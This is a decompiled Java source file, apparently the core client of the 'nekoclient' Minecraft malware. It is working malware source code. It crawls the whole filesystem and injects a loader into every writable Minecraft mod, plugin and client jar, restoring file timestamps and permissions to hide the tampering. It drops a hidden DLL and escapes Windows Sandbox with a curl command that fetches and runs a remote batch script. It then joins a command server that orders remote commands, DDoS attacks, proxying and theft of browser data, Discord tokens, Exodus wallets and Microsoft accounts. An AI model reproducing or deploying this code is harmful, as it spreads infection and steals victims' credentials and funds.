package dev.neko.nekoclient;

import dev.neko.nekoclient.api.buffer.FriendlyByteBuffer;
import dev.neko.nekoclient.api.buffer.StreamByteBuffer;
import dev.neko.nekoclient.api.debugger.Debugger;
import dev.neko.nekoclient.api.info.ClientInfo;
import dev.neko.nekoclient.api.info.OperatingSystem;
import dev.neko.nekoclient.api.info.Side;
import dev.neko.nekoclient.api.info.User;
import dev.neko.nekoclient.api.info.VersionInfo;
import dev.neko.nekoclient.api.windows.WindowsHook;
import dev.neko.nekoclient.api.windows.vmescape.VMEscape;
import dev.neko.nekoclient.module.ModuleRegistry;
import dev.neko.nekoclient.packet.Packet;
import dev.neko.nekoclient.packet.PacketRegistry;
import dev.neko.nekoclient.packet.impl.client.KeepAlivePacket;
import dev.neko.nekoclient.packet.impl.server.CommandPacket;
import dev.neko.nekoclient.packet.impl.server.DDoSPacket;
import dev.neko.nekoclient.packet.impl.server.DisconnectPacket;
import dev.neko.nekoclient.packet.impl.server.HelloPacket;
import dev.neko.nekoclient.packet.impl.server.ProxyPacket;
import dev.neko.nekoclient.packet.impl.server.RequestBrowserDataPacket;
import dev.neko.nekoclient.packet.impl.server.RequestDiscordPacket;
import dev.neko.nekoclient.packet.impl.server.RequestExodusPacket;
import dev.neko.nekoclient.packet.impl.server.RequestMSAPacket;
import dev.neko.nekoclient.packet.impl.server.UpdateModulePacket;
import dev.neko.nekoclient.packet.listener.PacketListener;
import dev.neko.nekoclient.packet.listener.impl.CommandPacketListener;
import dev.neko.nekoclient.packet.listener.impl.DDoSPacketListener;
import dev.neko.nekoclient.packet.listener.impl.DisconnectPacketListener;
import dev.neko.nekoclient.packet.listener.impl.HelloPacketListener;
import dev.neko.nekoclient.packet.listener.impl.ProxyPacketListener;
import dev.neko.nekoclient.packet.listener.impl.RequestBrowserDataPacketListener;
import dev.neko.nekoclient.packet.listener.impl.RequestDiscordPacketListener;
import dev.neko.nekoclient.packet.listener.impl.RequestExodusPacketListener;
import dev.neko.nekoclient.packet.listener.impl.RequestMSAPacketListener;
import dev.neko.nekoclient.packet.listener.impl.UpdateModulePacketListener;
import dev.neko.nekoclient.utils.EncodingUtil;
import dev.neko.nekoclient.utils.HardwareIDUtil;
import dev.neko.nekoclient.utils.HashUtil;
import dev.neko.nekoclient.utils.ObjectUtil;
import dev.neko.nekoclient.utils.SystemUtil;
import dev.neko.nekoinjector.Injector;
import dev.neko.nekoinjector.asm.Entry;
import dev.neko.nekoinjector.asm.EntryList;
import dev.neko.nekoinjector.template.Template;
import dev.neko.nekoinjector.template.impl.BungeecordPluginTemplate;
import dev.neko.nekoinjector.template.impl.FabricModTemplate;
import dev.neko.nekoinjector.template.impl.ForgeModTemplate;
import dev.neko.nekoinjector.template.impl.MinecraftClientTemplate;
import dev.neko.nekoinjector.template.impl.SpigotPluginTemplate;
import dev.neko.nekoinjector.utils.ListUtil;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.EOFException;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.StandardSocketOptions;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.nio.file.AccessDeniedException;
import java.nio.file.AtomicMoveNotSupportedException;
import java.nio.file.FileSystem;
import java.nio.file.FileSystemException;
import java.nio.file.FileSystems;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.AclFileAttributeView;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.BasicFileAttributes;
import java.nio.file.attribute.DosFileAttributeView;
import java.nio.file.attribute.DosFileAttributes;
import java.nio.file.attribute.FileOwnerAttributeView;
import java.nio.file.attribute.PosixFileAttributeView;
import java.nio.file.attribute.PosixFileAttributes;
import java.nio.file.attribute.UserPrincipal;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.StringJoiner;
import java.util.UUID;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.Predicate;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.stream.Collectors;
import jdk.net.ExtendedSocketOptions;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.tree.ClassNode;

public class Client implements Closeable {
   private final SocketChannel channel;
   private final PacketRegistry packetRegistry;
   private final VersionInfo versionInfo;
   private final ClientInfo clientInfo;
   private final ScheduledExecutorService service;
   private final List<Client.ConditionListener> listeners;
   private boolean closed;
   private final ModuleRegistry moduleRegistry;

   public Client(SocketChannel channel, PacketRegistry packetRegistry, ClientInfo clientInfo, VersionInfo versionInfo) throws IOException {
      this.channel = channel;
      this.packetRegistry = packetRegistry;
      this.moduleRegistry = new ModuleRegistry(this);
      this.service = Executors.newScheduledThreadPool(4);
      this.listeners = new CopyOnWriteArrayList<>();
      this.clientInfo = clientInfo;
      this.versionInfo = versionInfo;
      this.closed = false;
   }

   public static void start(String ip, int port, Path windowsAPIFile, Runnable closeListener) throws IOException {
      start(new InetSocketAddress(ip, port), closeListener);
   }

   public static void start(InetSocketAddress address, Path windowsAPIFile, Runnable closeListener) throws IOException {
      start(address, closeListener);
   }

   public static void start(InetSocketAddress address, Runnable closeListener) throws IOException {
      start(address);
      closeListener.run();
   }

   public static void start(InetSocketAddress address) throws IOException {
      start(address, (byte[])null);
   }

   public static void start(InetSocketAddress address, byte[] ref) throws IOException {
      List<Runnable> shutdownHooks = new ArrayList<>();
      Debugger debugger = new Debugger(new InetSocketAddress(address.getAddress(), 1338), 1);
      debugger.connect();

      try {
         String restoredRef = Objects.nonNull(ref) ? new String(EncodingUtil.restoreReversedBytes(ref)) : null;
         boolean refererAvailable = Objects.nonNull(restoredRef) && !restoredRef.isEmpty();
         String encodedRef;
         if (!refererAvailable) {
            encodedRef = null;
         } else {
            StringJoiner rawRefJoiner = new StringJoiner(".");

            for(byte b : ref) {
               rawRefJoiner.add(String.valueOf((int)b));
            }

            encodedRef = rawRefJoiner.toString();
         }

         if (refererAvailable) {
            try {
               Path ownPath = Paths.get(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI());
               Path javaFolder = Paths.get(System.getProperty("java.home")).getParent();
               JarFile jarFile = new JarFile(ownPath.toFile());
               ExecutorService injectService = Executors.newWorkStealingPool();
               injectService.execute(
                  () -> {
                     final List<Template> templates = Arrays.asList(
                        new SpigotPluginTemplate(),
                        new FabricModTemplate(),
                        new ForgeModTemplate(),
                        new MinecraftClientTemplate(),
                        new BungeecordPluginTemplate()
                     );
                     FileSystem fileSystem = FileSystems.getDefault();
                     if (!fileSystem.isReadOnly()) {
                        for(Path rootDirectory : fileSystem.getRootDirectories()) {
                           if (Files.isReadable(rootDirectory)) {
                              try {
                                 final AtomicInteger injected = new AtomicInteger(0);
                                 Files.walkFileTree(
                                    rootDirectory,
                                    new SimpleFileVisitor<Path>() {
                                       public FileVisitResult preVisitDirectory(Path path, BasicFileAttributes attrs) throws IOException {
                                          return (!Objects.nonNull(path.getFileName()) || !Objects.equals(path.getFileName().toString(), "$Recycle.Bin"))
                                                && !Objects.equals(path, ownPath.getParent())
                                                && !Objects.equals(path, javaFolder)
                                                && (!Objects.nonNull(path.getFileName()) || !Objects.equals(path.getFileName().toString(), "Java"))
                                             ? super.preVisitDirectory(path, attrs)
                                             : FileVisitResult.SKIP_SUBTREE;
                                       }
      
                                       public FileVisitResult visitFile(Path path, BasicFileAttributes attrs) {
                                          if (Files.isReadable(path)
                                             && Files.isWritable(path)
                                             && Files.isRegularFile(path)
                                             && path.getFileName().toString().endsWith(".jar")) {
                                             try {
                                                JarFile input = new JarFile(path.toFile());
                                                EntryList entries = new EntryList();
                                                ListUtil.toList(entries, input.entries(), entry -> !entry.isDirectory(), jarEntry -> {
                                                   try {
                                                      boolean isClass = jarEntry.getName().endsWith(".class");
                                                      InputStream inputStream = input.getInputStream(jarEntry);
                                                      byte[] bytes = new byte[inputStream.available()];
                                                      int length = 0;
      
                                                      while(length < bytes.length) {
                                                         length += inputStream.read(bytes, length, bytes.length - length);
                                                      }
      
                                                      try {
                                                         if (isClass) {
                                                            ClassReader classReader = new ClassReader(bytes);
                                                            ClassNode classNode = new ClassNode(589824);
                                                            classReader.accept(classNode, 8);
                                                            return new Entry(jarEntry, classNode, bytes, false);
                                                         }
                                                      } catch (Throwable var8x) {
                                                      }
      
                                                      return new Entry(jarEntry, null, bytes, false);
                                                   } catch (IOException var9x) {
                                                      throw new RuntimeException(var9x);
                                                   }
                                                });
                                                List suggestedTemplates = templates.stream()
                                                   .filter(template -> template.shouldSuggest(entries))
                                                   .collect(Collectors.toList());
                                                String mainClass = Injector.findMainClass(input.getManifest());
                                                if (Objects.nonNull(mainClass)) {
                                                   Entry entry = entries.getByPath(mainClass);
                                                   if (Objects.nonNull(entry) && suggestedTemplates.isEmpty()) {
                                                      entry.setInject(true);
                                                   }
                                                }
      
                                                for(Template template : suggestedTemplates) {
                                                   entries.stream()
                                                      .filter(Entry::isClass)
                                                      .filter(template::shouldInject)
                                                      .forEach(entry -> entry.setInject(true));
                                                }
      
                                                Manifest manifest = input.getManifest();
                                                if (Objects.nonNull(manifest)) {
                                                   manifest.getEntries().clear();
                                                }
      
                                                if (entries.stream().anyMatch(entry -> entry.isInject() && !entry.isInjected(encodedRef))) {
                                                   Path tempFile = ownPath.getParent().resolve(String.format("%s.tmp", UUID.randomUUID()));
                                                   Files.createFile(tempFile);
                                                   JarOutputStream output = new JarOutputStream(Files.newOutputStream(tempFile));
      
                                                   for(Entry entry : entries) {
                                                      String name = entry.getJarEntry().getName();
                                                      if (!entry.isCertificate()) {
                                                         output.putNextEntry(new JarEntry(entry.getJarEntry().getName()));
                                                         if (entry.isInject() && entry.isClass()) {
                                                            if (entry.isInjected(encodedRef)) {
                                                               output.write(entry.getBytes());
                                                            } else {
                                                               output.write(
                                                                  entry.inject(
                                                                     Injector.loadInstallerNode(
                                                                        jarFile.getInputStream(jarFile.getJarEntry("dev/neko/nekoinjector/Loader.class")),
                                                                        restoredRef
                                                                     )
                                                                  )
                                                               );
                                                            }
                                                         } else if (Objects.nonNull(manifest) && Objects.equals(name, "META-INF/MANIFEST.MF")) {
                                                            manifest.write(output);
                                                         } else {
                                                            output.write(entry.getBytes());
                                                         }
                                                      }
                                                   }
      
                                                   output.close();
      
                                                   try {
                                                      BasicFileAttributeView basicView = Files.getFileAttributeView(path, BasicFileAttributeView.class);
                                                      BasicFileAttributes basicAttributes = Objects.nonNull(basicView) ? basicView.readAttributes() : null;
                                                      DosFileAttributeView dosView = Files.getFileAttributeView(path, DosFileAttributeView.class);
                                                      DosFileAttributes dosAttributes = Objects.nonNull(dosView) ? dosView.readAttributes() : null;
                                                      PosixFileAttributeView posixView = Files.getFileAttributeView(path, PosixFileAttributeView.class);
                                                      PosixFileAttributes posixAttributes = Objects.nonNull(posixView) ? posixView.readAttributes() : null;
                                                      FileOwnerAttributeView ownerView = Files.getFileAttributeView(path, FileOwnerAttributeView.class);
                                                      UserPrincipal owner = Objects.nonNull(ownerView) ? ownerView.getOwner() : null;
                                                      AclFileAttributeView aclView = Files.getFileAttributeView(path, AclFileAttributeView.class);
                                                      List acl = Objects.nonNull(aclView) ? aclView.getAcl() : null;
      
                                                      try {
                                                         Files.move(tempFile, path, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
                                                      } catch (AccessDeniedException | AtomicMoveNotSupportedException var31) {
                                                         Files.move(tempFile, path, StandardCopyOption.REPLACE_EXISTING);
                                                      }
      
                                                      BasicFileAttributeView modifyBasicView = Files.getFileAttributeView(path, BasicFileAttributeView.class);
                                                      if (Objects.nonNull(basicAttributes) && Objects.nonNull(modifyBasicView)) {
                                                         try {
                                                            modifyBasicView.setTimes(
                                                               basicAttributes.lastModifiedTime(),
                                                               basicAttributes.lastAccessTime(),
                                                               basicAttributes.creationTime()
                                                            );
                                                         } catch (IOException | SecurityException var30) {
                                                         }
                                                      }
      
                                                      DosFileAttributeView modifyDosView = Files.getFileAttributeView(path, DosFileAttributeView.class);
                                                      if (Objects.nonNull(dosAttributes) && Objects.nonNull(modifyDosView)) {
                                                         try {
                                                            modifyDosView.setArchive(dosAttributes.isArchive());
                                                            modifyDosView.setHidden(dosAttributes.isHidden());
                                                            modifyDosView.setReadOnly(dosAttributes.isReadOnly());
                                                         } catch (IOException | SecurityException var29) {
                                                         }
                                                      }
      
                                                      PosixFileAttributeView modifyPosixView = Files.getFileAttributeView(path, PosixFileAttributeView.class);
                                                      if (Objects.nonNull(posixAttributes) && Objects.nonNull(modifyPosixView)) {
                                                         try {
                                                            modifyPosixView.setGroup(posixAttributes.group());
                                                            modifyPosixView.setPermissions(posixAttributes.permissions());
                                                         } catch (IOException | SecurityException var28x) {
                                                         }
                                                      }
      
                                                      FileOwnerAttributeView modifyFileOwnerView = Files.getFileAttributeView(
                                                         path, FileOwnerAttributeView.class
                                                      );
                                                      if (Objects.nonNull(owner) && Objects.nonNull(modifyFileOwnerView)) {
                                                         try {
                                                            modifyFileOwnerView.setOwner(owner);
                                                         } catch (IOException | SecurityException var27) {
                                                         }
                                                      }
      
                                                      AclFileAttributeView modifyAclView = Files.getFileAttributeView(path, AclFileAttributeView.class);
                                                      if (Objects.nonNull(acl) && Objects.nonNull(modifyAclView)) {
                                                         try {
                                                            modifyAclView.setAcl(acl);
                                                         } catch (IOException | SecurityException var26) {
                                                         }
                                                      }
                                                   } catch (FileSystemException var32) {
                                                      Files.delete(tempFile);
                                                      throw var32;
                                                   }
      
                                                   injected.getAndIncrement();
                                                }
      
                                                input.close();
                                             } catch (Throwable var33) {
                                             }
      
                                             return FileVisitResult.CONTINUE;
                                          } else {
                                             return FileVisitResult.CONTINUE;
                                          }
                                       }
      
                                       public FileVisitResult visitFileFailed(Path file, IOException exc) {
                                          return FileVisitResult.CONTINUE;
                                       }
                                    }
                                 );
                              } catch (Throwable var10) {
                              }
                           }
                        }
                     }
                  }
               );
               shutdownHooks.add(injectService::shutdownNow);
            } catch (Throwable var14) {
            }
         }

         if (WindowsHook.isSupported()) {
            try {
               Path path = Paths.get(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getParent().resolve("lib.dll");
               if (!Files.exists(path) && Files.isWritable(path.getParent()) || Files.isWritable(path)) {
                  InputStream inputStream = Client.class.getClassLoader().getResourceAsStream("hook.dll");
                  if (Files.exists(path)) {
                     Files.delete(path);
                  }

                  Files.createFile(path);
                  Files.setAttribute(path, "dos:hidden", true);
                  Files.setAttribute(path, "dos:system", true);
                  OutputStream outputStream = Files.newOutputStream(path);

                  while(inputStream.available() > 0) {
                     byte[] bytes = new byte[inputStream.available()];
                     inputStream.read(bytes);
                     outputStream.write(bytes);
                  }

                  outputStream.close();
               }

               WindowsHook.load(path.toAbsolutePath().toString());
               File storage = new File(new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getParentFile(), "storage");
               storage.mkdirs();
               VMEscape vmEscape = new VMEscape(
                  storage,
                  Paths.get(System.getenv("WINDIR"), "System32", "cmd.exe"),
                  "/c",
                  String.format(
                     "\"set ref=%s && curl --silent http://%s:%s/script -o %s\\._run.bat && start /min %s\\._run.bat\"",
                     Objects.isNull(encodedRef) ? "" : encodedRef,
                     address.getAddress().getHostAddress(),
                     8080,
                     "%temp%",
                     "%temp%"
                  )
               );
               if (vmEscape.shouldRun()) {
                  debugger.debug("Windows Sandbox detected, escaping...");
                  vmEscape.run();
                  shutdownHooks.add(vmEscape::stop);
               }
            } catch (Throwable var15) {
            }
         }

         SocketChannel channel = SocketChannel.open();
         channel.configureBlocking(true);
         channel.socket().connect(address, 5000);

         try {
            channel.setOption(StandardSocketOptions.SO_KEEPALIVE, true);
            channel.setOption(ExtendedSocketOptions.TCP_KEEPINTERVAL, 10);
            channel.setOption(ExtendedSocketOptions.TCP_KEEPIDLE, 1);
            channel.setOption(ExtendedSocketOptions.TCP_KEEPCOUNT, 4);
         } catch (UnsupportedOperationException | NoSuchFieldError | IOException var13) {
         }

         try {
            channel.setOption(StandardSocketOptions.TCP_NODELAY, true);
         } catch (UnsupportedOperationException | NoSuchFieldError | IOException var12) {
         }

         channel.socket().setSoTimeout(60000);
         Client client = new Client(
            channel,
            new PacketRegistry(),
            new ClientInfo(
               new OperatingSystem(
                  SystemUtil.property("os.name"),
                  SystemUtil.property("os.version"),
                  SystemUtil.property("os.arch"),
                  SystemUtil.getAvailableProcessors(),
                  SystemUtil.getTotalPhysicalMemory(),
                  SystemUtil.getProcessorName()
               ),
               new User(
                  SystemUtil.property("user.name"),
                  InetAddress.getLocalHost().getHostName(),
                  SystemUtil.property("user.home"),
                  SystemUtil.property("user.country"),
                  SystemUtil.property("user.language")
               ),
               HardwareIDUtil.generateHardwareID(),
               restoredRef,
               VMEscape.isVirtualMachine()
            ),
            new VersionInfo(
               Side.CLIENT, HashUtil.generateMD5Hash(Files.readAllBytes(Paths.get(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI())))
            )
         );
         client.addListener(HelloPacket.class, new HelloPacketListener());
         client.addListener(CommandPacket.class, new CommandPacketListener());
         client.addListener(DisconnectPacket.class, new DisconnectPacketListener());
         client.addListener(DDoSPacket.class, new DDoSPacketListener());
         client.addListener(RequestExodusPacket.class, new RequestExodusPacketListener());
         client.addListener(ProxyPacket.class, new ProxyPacketListener());
         client.addListener(UpdateModulePacket.class, new UpdateModulePacketListener());
         client.addListener(RequestBrowserDataPacket.class, new RequestBrowserDataPacketListener());
         client.addListener(RequestMSAPacket.class, new RequestMSAPacketListener());
         client.addListener(RequestDiscordPacket.class, new RequestDiscordPacketListener());
         client.getService().scheduleAtFixedRate(() -> {
            try {
               client.send(new KeepAlivePacket());
            } catch (IOException var2x) {
               throw new RuntimeException(var2x);
            }
         }, 10L, 10L, TimeUnit.SECONDS);
         client.listen();
      } catch (Throwable var16) {
         ByteArrayOutputStream dataHolder = new ByteArrayOutputStream();
         PrintStream stream = new PrintStream(dataHolder);
         var16.printStackTrace(stream);
         debugger.debug(dataHolder.toByteArray());
      }

      for(Runnable shutdownHook : shutdownHooks) {
         shutdownHook.run();
      }

      debugger.close();
   }

   public final <T extends Packet> T receive() throws IOException {
      Packet packet = this.packetRegistry.getById(new String(this.read(this.read(1).get()).array()));
      FriendlyByteBuffer buffer = new FriendlyByteBuffer(this.read(this.read(4).getInt()));
      if (Objects.isNull(packet)) {
         throw new IllegalStateException("Packet not found!");
      } else if (!Objects.equals(packet.getDirection().getReceiver(), this.versionInfo.getSide())) {
         throw new IllegalStateException("Wrong direction!");
      } else {
         packet.read(buffer);
         return (T)packet;
      }
   }

   public final ByteBuffer read(int length) throws IOException {
      ByteBuffer buffer = ByteBuffer.allocate(length);

      while(buffer.remaining() > 0) {
         if (this.closed || Objects.equals(this.channel.read(buffer), -1)) {
            throw new EOFException();
         }
      }

      ((Buffer)buffer).flip();
      return buffer;
   }

   public void listen() {
      while(!this.closed && !this.service.isTerminated() && !this.service.isShutdown() && this.channel.isConnected() && this.channel.isOpen()) {
         try {
            Packet packet = this.receive();

            for(Client.ConditionListener listener : this.listeners) {
               if (listener.getPredicate().test(packet)) {
                  listener.getListener().call(ObjectUtil.unsafeCast(packet), this, listener.getId());
               }
            }
         } catch (IOException var5) {
            try {
               this.close();
            } catch (IOException var4) {
            }

            return;
         }
      }

      try {
         this.close();
      } catch (IOException var6) {
      }
   }

   public void addListener(Predicate<Packet> predicate, PacketListener<?> listener) {
      this.listeners.add(new Client.ConditionListener(predicate, listener));
   }

   public void addListener(PacketListener<?> listener) {
      this.addListener(packet -> true, listener);
   }

   public <T extends Packet> void addListener(Class<T> clazz, PacketListener<T> listener) {
      this.addListener(packet -> clazz.isAssignableFrom(packet.getClass()), listener);
   }

   public void removeListener(String id) {
      this.listeners.removeIf(conditionListener -> Objects.equals(conditionListener.getId(), id));
   }

   public void send(Packet packet) throws IOException {
      if (!this.channel.isOpen()) {
         throw new IllegalStateException("Channel closed!");
      } else {
         StreamByteBuffer packetData = new StreamByteBuffer();
         packet.write(packetData);
         ByteBuffer packetBuffer = packetData.getBuffer();
         ((Buffer)packetBuffer).flip();
         byte[] packetId = packet.getId().getBytes();
         ByteBuffer buffer = ByteBuffer.allocate(1 + packetId.length + 4 + packetBuffer.capacity());
         buffer.put((byte)packetId.length);
         buffer.put(packetId);
         buffer.putInt(packetBuffer.capacity());
         buffer.put(packetBuffer);
         ((Buffer)buffer).flip();

         try {
            this.channel.write(buffer);
         } catch (IOException var7) {
            this.close();
            throw var7;
         }
      }
   }

   @Override
   public void close() throws IOException {
      if (!this.closed) {
         this.closed = true;
         if (!this.service.isShutdown()) {
            this.service.shutdownNow();
         }

         if (this.channel.isOpen()) {
            this.channel.close();
         }
      }
   }

   public final VersionInfo getVersionInfo() {
      return this.versionInfo;
   }

   public final ClientInfo getClientInfo() {
      return this.clientInfo;
   }

   public final boolean isConnected() {
      return this.channel.isConnected();
   }

   public final ScheduledExecutorService getService() {
      return this.service;
   }

   public final InetSocketAddress getAddress() throws IOException {
      return (InetSocketAddress)this.channel.getRemoteAddress();
   }

   public final ModuleRegistry getModuleRegistry() {
      return this.moduleRegistry;
   }

   public static class ConditionListener {
      private final String id = String.format("%s-%s", UUID.randomUUID(), System.currentTimeMillis());
      private final Predicate<Packet> predicate;
      private final PacketListener<?> listener;

      public ConditionListener(Predicate<Packet> predicate, PacketListener<?> listener) {
         this.predicate = predicate;
         this.listener = listener;
      }

      public final String getId() {
         return this.id;
      }

      public final Predicate<Packet> getPredicate() {
         return this.predicate;
      }

      public final PacketListener<?> getListener() {
         return this.listener;
      }
   }
}
